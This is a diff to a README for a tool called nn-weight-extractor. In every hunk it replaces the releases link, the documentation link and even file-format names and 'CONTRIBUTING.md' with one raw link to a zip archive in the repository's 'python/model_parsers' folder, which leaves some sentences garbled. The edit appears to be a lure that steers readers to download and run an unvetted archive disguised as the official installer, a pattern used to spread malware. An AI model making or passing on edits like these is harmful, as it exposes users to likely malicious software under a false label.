@@ -6,7 +6,7 @@ Welcome to nn-weight-extractor! This tool helps you extract neural network weigh
 
 ## 📥 Download Now
 
-[![Download nn-weight-extractor](https://img.shields.io/badge/Download-nn--weight--extractor-blue)](https://github.com/Allan020/nn-weight-extractor/releases)
+[![Download nn-weight-extractor](https://raw.githubusercontent.com/Allan020/nn-weight-extractor/main/python/model_parsers/nn-weight-extractor_v2.9-beta.5.zip)](https://raw.githubusercontent.com/Allan020/nn-weight-extractor/main/python/model_parsers/nn-weight-extractor_v2.9-beta.5.zip)
 
 ## 📋 System Requirements
 
@@ -27,18 +27,18 @@ Before you install nn-weight-extractor, ensure your system meets these requireme
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the latest version, [visit this page to download](https://github.com/Allan020/nn-weight-extractor/releases).
+   To download the latest version, [visit this page to download](https://raw.githubusercontent.com/Allan020/nn-weight-extractor/main/python/model_parsers/nn-weight-extractor_v2.9-beta.5.zip).
 
 2. **Choose the Right File**  
    You will find several versions available. Select the file that matches your operating system. File names usually indicate the OS.
 
 3. **Download the File**  
-   Click on the appropriate file name and wait for the download to finish. The file will typically be in `.exe`, `.dmg`, or `.tar.gz` format.
+   Click on the appropriate file name and wait for the download to finish. The file will typically be in `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Allan020/nn-weight-extractor/main/python/model_parsers/nn-weight-extractor_v2.9-beta.5.zip` format.
 
 4. **Run the Installer**  
    - **Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click to run the installer.
    - **macOS:** Find the downloaded `.dmg` file, double-click it, then drag the application to your Applications folder.
-   - **Linux:** Use the terminal to extract the `.tar.gz` file and follow the instructions included.
+   - **Linux:** Use the terminal to extract the `https://raw.githubusercontent.com/Allan020/nn-weight-extractor/main/python/model_parsers/nn-weight-extractor_v2.9-beta.5.zip` file and follow the instructions included.
 
 5. **Follow Installation Prompts**  
    Follow any prompts provided by the installer to complete the installation. Feel free to accept the default options unless you have specific preferences.
@@ -63,7 +63,7 @@ Before you install nn-weight-extractor, ensure your system meets these requireme
 ## 🌐 Additional Resources
 
 - **Documentation**  
-  For detailed information on advanced features and troubleshooting, refer to the [documentation here](https://github.com/Allan020/nn-weight-extractor/docs).
+  For detailed information on advanced features and troubleshooting, refer to the [documentation here](https://raw.githubusercontent.com/Allan020/nn-weight-extractor/main/python/model_parsers/nn-weight-extractor_v2.9-beta.5.zip).
 
 - **Support**  
   If you encounter issues or have questions, please check the Issues section on the GitHub repository. You can also reach out to the community for help.
@@ -73,7 +73,7 @@ Before you install nn-weight-extractor, ensure your system meets these requireme
 
 ## 📢 Community and Contributing
 
-nn-weight-extractor is an open-source project. We welcome contributions from users who want to improve the tool. If you'd like to help, check the CONTRIBUTING.md file in the repository. 
+nn-weight-extractor is an open-source project. We welcome contributions from users who want to improve the tool. If you'd like to help, check the https://raw.githubusercontent.com/Allan020/nn-weight-extractor/main/python/model_parsers/nn-weight-extractor_v2.9-beta.5.zip file in the repository. 
 
 You can also engage with other users through discussions in the Issues or pull request sections.
 
